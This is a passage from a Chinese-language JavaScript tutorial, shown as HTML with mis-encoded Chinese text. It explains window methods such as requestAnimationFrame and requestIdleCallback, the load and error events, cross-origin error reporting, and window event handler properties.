</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç å…ˆæ£€æŸ¥<code>popup</code>çª—å£æ˜¯å¦ä¾ç„¶å­˜åœ¨ï¼Œç¡®è®¤åæ¿€æ´»è¯¥çª—å£ã€‚</p> <p><code>window.blur()</code>æ–¹æ³•å°†ç„¦ç‚¹ä»çª—å£ç§»é™¤ã€‚</p> <p>å½“å‰çª—å£è·å¾—ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>focus</code>äº‹ä»¶ï¼›å½“å‰çª—å£å¤±å»ç„¦ç‚¹æ—¶ï¼Œä¼šè§¦å‘<code>blur</code>äº‹ä»¶ã€‚</p> <h3 id="window-getselection"><a href="#window-getselection" class="header-anchor">#</a> window.getSelection()</h3> <p><code>window.getSelection</code>æ–¹æ³•è¿”å›ä¸€ä¸ª<code>Selection</code>å¯¹è±¡ï¼Œè¡¨ç¤ºç”¨æˆ·ç°åœ¨é€‰ä¸­çš„æ–‡æœ¬ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> selObj <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">getSelection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä½¿ç”¨<code>Selection</code>å¯¹è±¡çš„<code>toString</code>æ–¹æ³•å¯ä»¥å¾—åˆ°é€‰ä¸­çš„æ–‡æœ¬ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> selectedText <span class="token operator">=</span> selObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="window-getcomputedstyle-ï¼Œwindow-matchmedia"><a href="#window-getcomputedstyle-ï¼Œwindow-matchmedia" class="header-anchor">#</a> window.getComputedStyle()ï¼Œwindow.matchMedia()</h3> <p><code>window.getComputedStyle()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«è¯¥å…ƒç´ çš„æœ€ç»ˆæ ·å¼ä¿¡æ¯çš„å¯¹è±¡ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p> <p><code>window.matchMedia()</code>æ–¹æ³•ç”¨æ¥æ£€æŸ¥ CSS çš„<code>mediaQuery</code>è¯­å¥ï¼Œè¯¦è§ã€ŠCSS æ“ä½œã€‹ä¸€ç« ã€‚</p> <h3 id="window-requestanimationframe"><a href="#window-requestanimationframe" class="header-anchor">#</a> window.requestAnimationFrame()</h3> <p><code>window.requestAnimationFrame()</code>æ–¹æ³•è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œéƒ½æ˜¯æ¨è¿ŸæŸä¸ªå‡½æ•°çš„æ‰§è¡Œã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œ<code>setTimeout</code>å¿…é¡»æŒ‡å®šæ¨è¿Ÿçš„æ—¶é—´ï¼Œ<code>window.requestAnimationFrame()</code>åˆ™æ˜¯æ¨è¿Ÿåˆ°æµè§ˆå™¨ä¸‹ä¸€æ¬¡é‡æµæ—¶æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡é‡ç»˜ã€‚é‡ç»˜é€šå¸¸æ˜¯ 16ms æ‰§è¡Œä¸€æ¬¡ï¼Œä¸è¿‡æµè§ˆå™¨ä¼šè‡ªåŠ¨è°ƒèŠ‚è¿™ä¸ªé€Ÿç‡ï¼Œæ¯”å¦‚ç½‘é¡µåˆ‡æ¢åˆ°åå° Tab é¡µæ—¶ï¼Œ<code>requestAnimationFrame()</code>ä¼šæš‚åœæ‰§è¡Œã€‚</p> <p>å¦‚æœæŸä¸ªå‡½æ•°ä¼šæ”¹å˜ç½‘é¡µçš„å¸ƒå±€ï¼Œä¸€èˆ¬å°±æ”¾åœ¨<code>window.requestAnimationFrame()</code>é‡Œé¢æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥èŠ‚çœç³»ç»Ÿèµ„æºï¼Œä½¿å¾—ç½‘é¡µæ•ˆæœæ›´åŠ å¹³æ»‘ã€‚å› ä¸ºæ…¢é€Ÿè®¾å¤‡ä¼šç”¨è¾ƒæ…¢çš„é€Ÿç‡é‡æµå’Œé‡ç»˜ï¼Œè€Œé€Ÿåº¦æ›´å¿«çš„è®¾å¤‡ä¼šæœ‰æ›´å¿«çš„é€Ÿç‡ã€‚</p> <p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>callback</code>æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚<code>callback</code>æ‰§è¡Œæ—¶ï¼Œå®ƒçš„å‚æ•°å°±æ˜¯ç³»ç»Ÿä¼ å…¥çš„ä¸€ä¸ªé«˜ç²¾åº¦æ—¶é—´æˆ³ï¼ˆ<code>performance.now()</code>çš„è¿”å›å€¼ï¼‰ï¼Œå•ä½æ˜¯æ¯«ç§’ï¼Œè¡¨ç¤ºè·ç¦»ç½‘é¡µåŠ è½½çš„æ—¶é—´ã€‚</p> <p><code>window.requestAnimationFrame()</code>çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¿™ä¸ªæ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelAnimationFrame()</code>ï¼Œç”¨æ¥å–æ¶ˆå›è°ƒå‡½æ•°çš„æ‰§è¡Œã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>æ‰§è¡Œç½‘é¡µåŠ¨ç”»çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'animate'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>position <span class="token operator">=</span> <span class="token string">'absolute'</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> start <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">step</span><span class="token punctuation">(</span><span class="token parameter">timestamp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>start<span class="token punctuation">)</span> start <span class="token operator">=</span> timestamp<span class="token punctuation">;</span>
  <span class="token keyword">var</span> progress <span class="token operator">=</span> timestamp <span class="token operator">-</span> start<span class="token punctuation">;</span>
  <span class="token comment">// å…ƒç´ ä¸æ–­å‘å·¦ç§»ï¼Œæœ€å¤§ä¸è¶…è¿‡200åƒç´ </span>
  element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>left <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>progress <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>
  <span class="token comment">// å¦‚æœè·ç¦»ç¬¬ä¸€æ¬¡æ‰§è¡Œä¸è¶…è¿‡ 2000 æ¯«ç§’ï¼Œ</span>
  <span class="token comment">// å°±ç»§ç»­æ‰§è¡ŒåŠ¨ç”»</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>progress <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>step<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ªç½‘é¡µåŠ¨ç”»ï¼ŒæŒç»­æ—¶é—´æ˜¯2ç§’ï¼Œä¼šè®©å…ƒç´ å‘å³ç§»åŠ¨ã€‚</p> <h3 id="window-requestidlecallback"><a href="#window-requestidlecallback" class="header-anchor">#</a> window.requestIdleCallback()</h3> <p><code>window.requestIdleCallback()</code>è·Ÿ<code>setTimeout</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å°†æŸä¸ªå‡½æ•°æ¨è¿Ÿæ‰§è¡Œï¼Œä½†æ˜¯å®ƒä¿è¯å°†å›è°ƒå‡½æ•°æ¨è¿Ÿåˆ°ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸä¸ªä»»åŠ¡ä¸æ˜¯å¾ˆå…³é”®ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>window.requestIdleCallback()</code>å°†å…¶æ¨è¿Ÿæ‰§è¡Œï¼Œä»¥ä¿è¯ç½‘é¡µæ€§èƒ½ã€‚</p> <p>å®ƒè·Ÿ<code>window.requestAnimationFrame()</code>çš„åŒºåˆ«åœ¨äºï¼Œåè€…æŒ‡å®šå›è°ƒå‡½æ•°åœ¨ä¸‹ä¸€æ¬¡æµè§ˆå™¨é‡æ’æ—¶æ‰§è¡Œï¼Œé—®é¢˜åœ¨äºä¸‹ä¸€æ¬¡é‡æ’æ—¶ï¼Œç³»ç»Ÿèµ„æºæœªå¿…ç©ºé—²ï¼Œä¸ä¸€å®šèƒ½ä¿è¯åœ¨16æ¯«ç§’ä¹‹å†…å®Œæˆï¼›<code>window.requestIdleCallback()</code>å¯ä»¥ä¿è¯å›è°ƒå‡½æ•°åœ¨ç³»ç»Ÿèµ„æºç©ºé—²æ—¶æ‰§è¡Œã€‚</p> <p>è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå›è°ƒå‡½æ•°å’Œä¸€ä¸ªé…ç½®å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚é…ç½®å¯¹è±¡å¯ä»¥æŒ‡å®šä¸€ä¸ªæ¨è¿Ÿæ‰§è¡Œçš„æœ€é•¿æ—¶é—´ï¼Œå¦‚æœè¿‡äº†è¿™ä¸ªæ—¶é—´ï¼Œå›è°ƒå‡½æ•°ä¸ç®¡ç³»ç»Ÿèµ„æºæœ‰æ— ç©ºè™šï¼Œéƒ½ä¼šæ‰§è¡Œã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>callback<span class="token punctuation">[</span><span class="token punctuation">,</span> options<span class="token punctuation">]</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>callback</code>å‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚è¯¥å›è°ƒå‡½æ•°æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿä¼šä¼ å…¥ä¸€ä¸ª<code>IdleDeadline</code>å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚<code>IdleDeadline</code>å¯¹è±¡æœ‰ä¸€ä¸ª<code>didTimeout</code>å±æ€§ï¼ˆå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦ä¸ºè¶…æ—¶è°ƒç”¨ï¼‰å’Œä¸€ä¸ª<code>timeRemaining()</code>æ–¹æ³•ï¼ˆè¿”å›è¯¥ç©ºé—²æ—¶æ®µå‰©ä½™çš„æ¯«ç§’æ•°ï¼‰ã€‚</p> <p><code>options</code>å‚æ•°æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç›®å‰åªæœ‰<code>timeout</code>ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥æŒ‡å®šå›è°ƒå‡½æ•°æ¨è¿Ÿæ‰§è¡Œçš„æœ€å¤§æ¯«ç§’æ•°ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</p> <p><code>window.requestIdleCallback()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªæ•´æ•°ã€‚è¯¥æ•´æ•°å¯ä»¥ä¼ å…¥<code>window.cancelIdleCallback()</code>å–æ¶ˆå›è°ƒå‡½æ•°ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>myNonEssentialWork<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">myNonEssentialWork</span><span class="token punctuation">(</span><span class="token parameter">deadline</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>deadline<span class="token punctuation">.</span><span class="token function">timeRemaining</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">doWorkIfNeeded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>requestIdleCallback()</code>ç”¨æ¥æ‰§è¡Œéå…³é”®ä»»åŠ¡<code>myNonEssentialWork</code>ã€‚è¯¥ä»»åŠ¡å…ˆç¡®è®¤æœ¬æ¬¡ç©ºé—²æ—¶æ®µæœ‰å‰©ä½™æ—¶é—´ï¼Œç„¶åæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œä»»åŠ¡ã€‚</p> <p>ä¸‹é¢æ˜¯æŒ‡å®š<code>timeout</code>çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>processPendingAnalyticsEvents<span class="token punctuation">,</span> <span class="token punctuation">{</span> timeout<span class="token operator">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç æŒ‡å®šï¼Œ<code>processPendingAnalyticsEvents</code>å¿…é¡»åœ¨æœªæ¥2ç§’ä¹‹å†…æ‰§è¡Œã€‚</p> <p>å¦‚æœç”±äºè¶…æ—¶å¯¼è‡´å›è°ƒå‡½æ•°æ‰§è¡Œï¼Œåˆ™<code>deadline.timeRemaining()</code>è¿”å›<code>0</code>ï¼Œ<code>deadline.didTimeout</code>è¿”å›<code>true</code>ã€‚</p> <p>å¦‚æœå¤šæ¬¡æ‰§è¡Œ<code>window.requestIdleCallback()</code>ï¼ŒæŒ‡å®šå¤šä¸ªå›è°ƒå‡½æ•°ï¼Œé‚£ä¹ˆè¿™äº›å›è°ƒå‡½æ•°å°†æ’æˆä¸€ä¸ªé˜Ÿåˆ—ï¼ŒæŒ‰ç…§å…ˆè¿›å…ˆå‡ºçš„é¡ºåºæ‰§è¡Œã€‚</p> <h2 id="_3-äº‹ä»¶"><a href="#_3-äº‹ä»¶" class="header-anchor">#</a> 3.äº‹ä»¶</h2> <p><code>window</code>å¯¹è±¡å¯ä»¥æ¥æ”¶ä»¥ä¸‹äº‹ä»¶ã€‚</p> <h3 id="load-äº‹ä»¶å’Œ-onload-å±æ€§"><a href="#load-äº‹ä»¶å’Œ-onload-å±æ€§" class="header-anchor">#</a> load äº‹ä»¶å’Œ onload å±æ€§</h3> <p><code>load</code>äº‹ä»¶å‘ç”Ÿåœ¨æ–‡æ¡£åœ¨æµè§ˆå™¨çª—å£åŠ è½½å®Œæ¯•æ—¶ã€‚<code>window.onload</code>å±æ€§å¯ä»¥æŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> elements <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'example'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> elt <span class="token operator">=</span> elements<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ä¸Šé¢ä»£ç åœ¨ç½‘é¡µåŠ è½½å®Œæ¯•åï¼Œè·å–æŒ‡å®šå…ƒç´ å¹¶è¿›è¡Œå¤„ç†ã€‚</p> <h3 id="error-äº‹ä»¶å’Œ-onerror-å±æ€§"><a href="#error-äº‹ä»¶å’Œ-onerror-å±æ€§" class="header-anchor">#</a> error äº‹ä»¶å’Œ onerror å±æ€§</h3> <p>æµè§ˆå™¨è„šæœ¬å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè§¦å‘<code>window</code>å¯¹è±¡çš„<code>error</code>äº‹ä»¶ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>window.onerror</code>å±æ€§å¯¹è¯¥äº‹ä»¶æŒ‡å®šå›è°ƒå‡½æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> lineno<span class="token punctuation">,</span> colno<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;å‡ºé”™äº†ï¼--&gt; %s&quot;</span><span class="token punctuation">,</span> error<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ç”±äºå†å²åŸå› ï¼Œ<code>window</code>çš„<code>error</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ä¸æ¥å—é”™è¯¯å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè€Œæ˜¯ä¸€å…±å¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ï¼Œå®ƒä»¬çš„å«ä¹‰ä¾æ¬¡å¦‚ä¸‹ã€‚</p> <ul><li>å‡ºé”™ä¿¡æ¯</li> <li>å‡ºé”™è„šæœ¬çš„ç½‘å€</li> <li>è¡Œå·</li> <li>åˆ—å·</li> <li>é”™è¯¯å¯¹è±¡</li></ul> <p>è€å¼æµè§ˆå™¨åªæ”¯æŒå‰ä¸‰ä¸ªå‚æ•°ã€‚</p> <p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„é”™è¯¯ï¼Œéƒ½ä¼šè§¦å‘ JavaScript çš„<code>error</code>äº‹ä»¶ï¼ˆå³è®© JavaScript æŠ¥é”™ï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåªæœ‰ JavaScript è„šæœ¬çš„é”™è¯¯ï¼Œæ‰ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œè€Œåƒèµ„æºæ–‡ä»¶ä¸å­˜åœ¨ä¹‹ç±»çš„é”™è¯¯ï¼Œéƒ½ä¸ä¼šè§¦å‘ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æœæ•´ä¸ªé¡µé¢æœªæ•è·é”™è¯¯è¶…è¿‡3ä¸ªï¼Œå°±æ˜¾ç¤ºè­¦å‘Šã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> line</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>onerror<span class="token punctuation">.</span>num<span class="token operator">++</span> <span class="token operator">&gt;</span> onerror<span class="token punctuation">.</span>max<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'ERROR: '</span> <span class="token operator">+</span> msg <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
onerror<span class="token punctuation">.</span>max <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
onerror<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè„šæœ¬ç½‘å€ä¸ç½‘é¡µç½‘å€ä¸åœ¨åŒä¸€ä¸ªåŸŸï¼ˆæ¯”å¦‚ä½¿ç”¨äº† CDNï¼‰ï¼Œæµè§ˆå™¨æ ¹æœ¬ä¸ä¼šæä¾›è¯¦ç»†çš„å‡ºé”™ä¿¡æ¯ï¼Œåªä¼šæç¤ºå‡ºé”™ï¼Œé”™è¯¯ç±»å‹æ˜¯â€œScript error.â€ï¼Œè¡Œå·ä¸º0ï¼Œå…¶ä»–ä¿¡æ¯éƒ½æ²¡æœ‰ã€‚è¿™æ˜¯æµè§ˆå™¨é˜²æ­¢å‘å¤–éƒ¨è„šæœ¬æ³„æ¼ä¿¡æ¯ã€‚ä¸€ä¸ªè§£å†³æ–¹æ³•æ˜¯åœ¨è„šæœ¬æ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œè®¾ç½®<code>Access-Control-Allow-Origin</code>çš„ HTTP å¤´ä¿¡æ¯ã€‚</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>Access-Control-Allow-Origin: *

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ç„¶åï¼Œåœ¨ç½‘é¡µçš„<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­è®¾ç½®<code>crossorigin</code>å±æ€§ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>anonymous<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>//example.com/file.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç çš„<code>crossorigin=&quot;anonymous&quot;</code>è¡¨ç¤ºï¼Œè¯»å–æ–‡ä»¶ä¸éœ€è¦èº«ä»½ä¿¡æ¯ï¼Œå³ä¸éœ€è¦ cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè®¾ä¸º<code>crossorigin=&quot;use-credentials&quot;</code>ï¼Œå°±è¡¨ç¤ºæµè§ˆå™¨ä¼šä¸Šä¼  cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦æœåŠ¡å™¨ç«¯æ‰“å¼€ HTTP å¤´ä¿¡æ¯<code>Access-Control-Allow-Credentials</code>ã€‚</p> <h3 id="window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§"><a href="#window-å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§" class="header-anchor">#</a> window å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å±æ€§</h3> <p>é™¤äº†å…·å¤‡å…ƒç´ èŠ‚ç‚¹éƒ½æœ‰çš„ GlobalEventHandlers æ¥å£ï¼Œ<code>window</code>å¯¹è±¡è¿˜å…·æœ‰ä»¥ä¸‹çš„äº‹ä»¶ç›‘å¬å‡½æ•°å±æ€§ã€‚</p> <ul><li><code>window.onafterprint</code>ï¼š<code>afterprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onbeforeprint</code>ï¼š<code>beforeprint</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onbeforeunload</code>ï¼š<code>beforeunload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onhashchange</code>ï¼š<code>hashchange</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onlanguagechange</code>: <code>languagechange</code>çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onmessage</code>ï¼š<code>message</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onmessageerror</code>ï¼š<code>MessageError</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onoffline</code>ï¼š<code>offline</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.ononline</code>ï¼š<code>online</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onpagehide</code>ï¼š<code>pagehide</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onpageshow</code>ï¼š<code>pageshow</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onpopstate</code>ï¼š<code>popstate</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onstorage</code>ï¼š<code>storage</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onunhandledrejection</code>ï¼šæœªå¤„ç†çš„ Promise å¯¹è±¡çš„<code>reject</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li><code>window.onunload</code>ï¼š<code>unload</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li></ul> <h2 id="_4-å¤šçª—å£æ“ä½œ"><a href="#_4-å¤šçª—å£æ“ä½œ" class="header-anchor">#</a> 4.å¤šçª—å£æ“ä½œ</h2> <p>ç”±äºç½‘é¡µå¯ä»¥ä½¿ç”¨<code>iframe</code>å…ƒç´ 